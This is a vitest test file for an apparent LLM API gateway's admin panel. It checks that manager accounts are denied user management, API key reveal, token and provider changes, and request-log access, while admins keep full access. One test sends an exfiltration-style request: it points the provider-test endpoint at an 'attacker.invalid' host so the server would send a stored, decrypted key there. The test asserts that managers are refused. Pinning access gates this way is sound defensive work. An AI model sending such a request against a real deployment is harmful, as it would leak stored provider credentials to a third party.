/**
 * Role narrowing: user management is admin-only in its entirety, and issued
 * API keys can only be re-revealed (copied) by an admin. A manager keeps the
 * read-only dashboard surfaces (token list, provider list, stats) and their
 * own password.
 *
 * Credential-bearing surfaces are admin-only on their write side: provider
 * mutations (and "test with the stored key", which sends the decrypted key to
 * the caller's baseUrl), token mutations (scope/enabled decide who can spend
 * which provider), and the request log (every caller's full conversation
 * payload). This test pins the whole matrix so a route added without a gate
 * fails here rather than shipping.
 */
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import type { FastifyInstance } from "fastify";

const ADMIN_PASSWORD = "role-test-admin-pass";
const MANAGER_PASSWORD = "role-test-manager-pass";

let app: FastifyInstance;
let sqlite: { close: () => void };
let dataDir: string;
let tokenId: number;
let providerId: number;
let adminCookie: string;
let managerCookie: string;

async function login(username: string, password: string): Promise<string> {
  const res = await app.inject({ method: "POST", url: "/admin/api/login", payload: { username, password } });
  expect(res.statusCode).toBe(200);
  const session = res.cookies.find((c) => c.name === "hydrogen_session");
  expect(session).toBeTruthy();
  return `${session!.name}=${session!.value}`;
}

beforeAll(async () => {
  dataDir = fs.mkdtempSync(path.join(os.tmpdir(), "hydrogen-roles-"));
  process.env.NODE_ENV = "test";
  process.env.DATA_DIR = dataDir;
  process.env.ADMIN_PASSWORD = ADMIN_PASSWORD;
  process.env.SESSION_SECRET = "role-test-session-secret-0123456789";

  const { boot } = await import("../src/composition/container");
  const { buildApp } = await import("../src/app");
  const c = await boot();
  await c.users.create({ username: "mgr", password: MANAGER_PASSWORD, role: "manager", enabled: true });
  tokenId = c.tokens.create({ name: "copyable" }).token.id;
  providerId = c.providers.create({
    name: "prov",
    type: "openai_completion",
    baseUrl: "http://provider.invalid/v1",
    apiKey: "prov-secret-key",
  }).id;
  sqlite = c.sqlite;

  app = await buildApp(c);
  adminCookie = await login("admin", ADMIN_PASSWORD);
  managerCookie = await login("mgr", MANAGER_PASSWORD);
});

afterAll(async () => {
  await app.close();
  sqlite.close();
  fs.rmSync(dataDir, { recursive: true, force: true });
});

const as = (cookie: string, opts: { method?: "GET" | "POST" | "PATCH" | "DELETE"; url: string; payload?: unknown }) =>
  app.inject({ method: opts.method ?? "GET", url: opts.url, payload: opts.payload as never, headers: { cookie } });

describe("manager restrictions", () => {
  it("cannot copy an issued API key (secret reveal is admin-only, and now a POST)", async () => {
    const res = await as(managerCookie, { method: "POST", url: `/admin/api/tokens/${tokenId}/secret` });
    expect(res.statusCode).toBe(403);
  });

  it("cannot view users", async () => {
    const res = await as(managerCookie, { url: "/admin/api/users" });
    expect(res.statusCode).toBe(403);
  });

  it("cannot create users (not even managers)", async () => {
    const res = await as(managerCookie, {
      method: "POST",
      url: "/admin/api/users",
      payload: { username: "peer", password: "peer-pass-123", role: "manager" },
    });
    expect(res.statusCode).toBe(403);
  });

  it("cannot modify or delete users either", async () => {
    expect((await as(managerCookie, { method: "PATCH", url: "/admin/api/users/1", payload: { enabled: false } })).statusCode).toBe(403);
    expect((await as(managerCookie, { method: "DELETE", url: "/admin/api/users/1" })).statusCode).toBe(403);
  });

  it("still sees the token list and stats", async () => {
    expect((await as(managerCookie, { url: "/admin/api/tokens" })).statusCode).toBe(200);
    expect((await as(managerCookie, { url: "/admin/api/stats/summary" })).statusCode).toBe(200);
  });

  // --- tokens: mutations are admin-only like issuing and revealing ---------

  it("cannot modify or delete an API key", async () => {
    expect(
      (await as(managerCookie, { method: "PATCH", url: `/admin/api/tokens/${tokenId}`, payload: { enabled: false } })).statusCode,
    ).toBe(403);
    expect((await as(managerCookie, { method: "DELETE", url: `/admin/api/tokens/${tokenId}` })).statusCode).toBe(403);
  });

  // --- providers: credential-bearing rows ---------------------------------

  it("sees the provider list but cannot create, modify, or delete providers", async () => {
    expect((await as(managerCookie, { url: "/admin/api/providers" })).statusCode).toBe(200);
    const create = await as(managerCookie, {
      method: "POST",
      url: "/admin/api/providers",
      payload: { name: "rogue", type: "openai_completion", baseUrl: "http://rogue.invalid/v1", apiKey: "k" },
    });
    expect(create.statusCode).toBe(403);
    expect(
      (await as(managerCookie, { method: "PATCH", url: `/admin/api/providers/${providerId}`, payload: { name: "renamed" } })).statusCode,
    ).toBe(403);
    expect((await as(managerCookie, { method: "DELETE", url: `/admin/api/providers/${providerId}` })).statusCode).toBe(403);
  });

  it("cannot test a provider with its STORED key (the exfiltration primitive)", async () => {
    // No apiKey in the payload + an id: the server would decrypt the stored
    // key and send it to the caller-chosen baseUrl. Admin-only now.
    const res = await as(managerCookie, {
      method: "POST",
      url: "/admin/api/providers/test",
      payload: { id: providerId, type: "openai_completion", baseUrl: "http://attacker.invalid/v1" },
    });
    expect(res.statusCode).toBe(403);
  });

  it("can still test a provider with the form's own key (no stored key involved)", async () => {
    const res = await as(managerCookie, {
      method: "POST",
      url: "/admin/api/providers/test",
      payload: { type: "openai_completion", baseUrl: "http://provider.invalid/v1", apiKey: "manager-own-key" },
    });
    expect(res.statusCode).toBe(200);
  });

  // --- request logs: every caller's conversation payload --------------------

  it("cannot read the request log", async () => {
    expect((await as(managerCookie, { url: "/admin/api/logs" })).statusCode).toBe(403);
    expect((await as(managerCookie, { url: "/admin/api/logs/1" })).statusCode).toBe(403);
  });
});

describe("admin keeps the full surface", () => {
  it("views users, creates a user, and copies a key", async () => {
    expect((await as(adminCookie, { url: "/admin/api/users" })).statusCode).toBe(200);

    const created = await as(adminCookie, {
      method: "POST",
      url: "/admin/api/users",
      payload: { username: "second", password: "second-pass-123", role: "manager" },
    });
    expect(created.statusCode).toBe(201);

    const reveal = await as(adminCookie, { method: "POST", url: `/admin/api/tokens/${tokenId}/secret` });
    expect(reveal.statusCode).toBe(200);
    expect((reveal.json() as { secret: string }).secret).toMatch(/^sk-/);
  });

  it("modifies and deletes API keys, and reads the log", async () => {
    expect(
      (await as(adminCookie, { method: "PATCH", url: `/admin/api/tokens/${tokenId}`, payload: { enabled: false } })).statusCode,
    ).toBe(200);
    expect((await as(adminCookie, { url: "/admin/api/logs" })).statusCode).toBe(200);
  });

  it("tests a provider with its stored key", async () => {
    const res = await as(adminCookie, {
      method: "POST",
      url: "/admin/api/providers/test",
      payload: { id: providerId, type: "openai_completion", baseUrl: "http://provider.invalid/v1" },
    });
    // 200 with a (likely failed, .invalid does not resolve) connection result.
    expect(res.statusCode).toBe(200);
  });
});